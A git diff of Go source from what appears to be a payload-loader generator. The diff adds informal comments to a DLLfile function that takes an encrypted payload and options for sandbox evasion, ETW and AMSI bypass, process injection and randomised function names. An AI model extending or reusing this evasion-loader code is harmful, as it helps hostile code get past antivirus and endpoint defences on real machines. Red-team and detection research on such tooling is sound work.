@@ -21,6 +21,8 @@ type Binary struct {
 	Variables map[string]string
 }
 
+// these are being created for future mapping of all the content intake
+
 type JScript struct {
 	Variables map[string]string
 }
@@ -202,14 +204,21 @@ func WriteProcessMemory_Buff(number string, b64number int) (string, string, stri
 
 func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, ETW bool, ProcessInjection string, AMSI bool) (string, string, string) {
 	var LoaderTemplate, DLLStructTemplate string
+	// read and assign DLL to variable 'DLL'
 	DLL := &DLL{}
+	// Initiate the Map in order to handle all incoming content
 	DLL.Variables = make(map[string]string)
+	// assigning sandbox to its memory location
 	Sandboxfunction := &Sandboxfunction{}
 	Sandboxfunction.Variables = make(map[string]string)
 	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
 	Sandbox_DomainJoined.Variables = make(map[string]string)
+	// oh yah get that version
 	WindowsVersion := &WindowsVersion{}
+	// important for syscall selection (i like to think)
 	WindowsVersion.Variables = make(map[string]string)
+	
+	// all refrences for 'Cryptor' are to the package file
 	DLL.Variables["FuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
 	DLL.Variables["NTFuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
 	DLL.Variables["buff"] = Cryptor.VarNumberLength(10, 19)
